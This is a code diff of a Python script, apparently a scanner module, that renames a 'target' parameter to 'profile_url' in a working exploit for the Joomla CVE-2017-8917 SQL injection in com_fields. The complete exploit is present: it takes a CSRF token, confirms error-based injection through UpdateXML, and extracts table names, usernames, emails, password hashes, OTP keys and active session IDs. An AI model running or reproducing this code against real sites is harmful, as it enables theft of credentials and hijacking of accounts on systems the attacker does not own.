@@ -19,9 +19,9 @@ def extract_csrf_token(response):
 def build_sqli_query(column_name, additional_query):
     return f"(SELECT {column_name} {additional_query})"
 
-def joomla_sqli_data_extraction(session, token, target, column_name, additional_query):
+def joomla_sqli_data_extraction(session, token, profile_url, column_name, additional_query):
     sqli = build_sqli_query(f"LENGTH({column_name})", additional_query)
-    length = perform_sqli(session, token, target, sqli)
+    length = perform_sqli(session, token, profile_url, sqli)
     if not length:
         return None
     length = int(length)
@@ -29,7 +29,7 @@ def joomla_sqli_data_extraction(session, token, target, column_name, additional_
     extracted_data = ''
     while length > offset:
         sqli = build_sqli_query(f"HEX(MID({column_name},{offset + 1},16))", additional_query)
-        value = perform_sqli(session, token, target, sqli)
+        value = perform_sqli(session, token, profile_url, sqli)
         if not value:
             print("[~] Failed to retrieve data from query:", sqli)
             return None
@@ -38,7 +38,7 @@ def joomla_sqli_data_extraction(session, token, target, column_name, additional_
         offset += len(value)
     return extracted_data
 
-def perform_sqli(session, token, target, sqli):
+def perform_sqli(session, token, profile_url, sqli):
     sqli_full = f"UpdateXML(2, concat(0x3a,{sqli}, 0x3a), 1)"
     data = {
         'option': 'com_fields',
@@ -47,7 +47,7 @@ def perform_sqli(session, token, target, sqli):
         'list[fullordering]': sqli_full,
         token: '1',
     }
-    response = session.get(f"{target}/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False, verify=False)
+    response = session.get(f"{profile_url}/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False, verify=False)
     match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', response.text, re.S)
     if match:
         match = match.group(1).strip()
@@ -55,12 +55,12 @@ def perform_sqli(session, token, target, sqli):
             return None
         return match[1:-1]
 
-def extract_joomla_table_names(session, token, target):
+def extract_joomla_table_names(session, token, profile_url):
     tables = []
     offset = 0
     print("[~] Starting table extraction...")
     while True:
-        result = joomla_sqli_data_extraction(session, token, target, "TABLE_NAME", f"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT {offset},1")
+        result = joomla_sqli_data_extraction(session, token, profile_url, "TABLE_NAME", f"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT {offset},1")
         if result is None:
             break
         tables.append(result)
@@ -68,12 +68,12 @@ def extract_joomla_table_names(session, token, target):
         offset += 1
     return tables
 
-def extract_joomla_users(session, token, target, table_name):
+def extract_joomla_users(session, token, profile_url, table_name):
     users = []
     offset = 0
     print(f"[~] Extracting users from table: {table_name}")
     while True:
-        result = joomla_sqli_data_extraction(session, token, target, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", f"FROM {table_name} ORDER BY registerDate ASC LIMIT {offset},1")
+        result = joomla_sqli_data_extraction(session, token, profile_url, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", f"FROM {table_name} ORDER BY registerDate ASC LIMIT {offset},1")
         if result is None:
             break
         result = result.split('|')
@@ -82,12 +82,12 @@ def extract_joomla_users(session, token, target, table_name):
         offset += 1
     return users
 
-def extract_joomla_sessions(session, token, target, table_name):
+def extract_joomla_sessions(session, token, profile_url, table_name):
     sessions = []
     offset = 0
     print(f"[~] Extracting sessions from table: {table_name}")
     while True:
-        result = joomla_sqli_data_extraction(session, token, target, "CONCAT(userid,0x7c,session_id,0x7c,username)", f"FROM {table_name} WHERE guest = 0 LIMIT {offset},1")
+        result = joomla_sqli_data_extraction(session, token, profile_url, "CONCAT(userid,0x7c,session_id,0x7c,username)", f"FROM {table_name} WHERE guest = 0 LIMIT {offset},1")
         if result is None:
             break
         result = result.split('|')
@@ -96,33 +96,33 @@ def extract_joomla_sessions(session, token, target, table_name):
         offset += 1
     return sessions
 
-def run_cve_exploit(target):
+def run_cve_exploit(profile_url):
     session = requests.Session()
 
     print("[~] Fetching CSRF token from the login page.")
-    response = session.get(f"{target}/index.php/component/users/?view=login", verify=False)
+    response = session.get(f"{profile_url}/index.php/component/users/?view=login", verify=False)
     token = extract_csrf_token(response)
     if not token:
         return False
 
     print("[~] Verifying SQL injection.")
-    sqli_test_result = perform_sqli(session, token, target, "128+127")
+    sqli_test_result = perform_sqli(session, token, profile_url, "128+127")
     if sqli_test_result != "255":
         print("[~] SQL injection test failed.")
         return False
 
     print("[~] Extracting Joomla database tables.")
-    tables = extract_joomla_table_names(session, token, target)
+    tables = extract_joomla_table_names(session, token, profile_url)
 
     for table_name in tables:
         table_prefix = table_name[:-5]
-        extract_joomla_users(session, token, target, table_name)
-        extract_joomla_sessions(session, token, target, f"{table_prefix}session")
+        extract_joomla_users(session, token, profile_url, table_name)
+        extract_joomla_sessions(session, token, profile_url, f"{table_prefix}session")
 
     return True
 
-def scan_cve_2017_8917(target):
-    run_cve_exploit(target)
+def scan_cve_2017_8917(profile_url):
+    run_cve_exploit(profile_url)
 
 
 
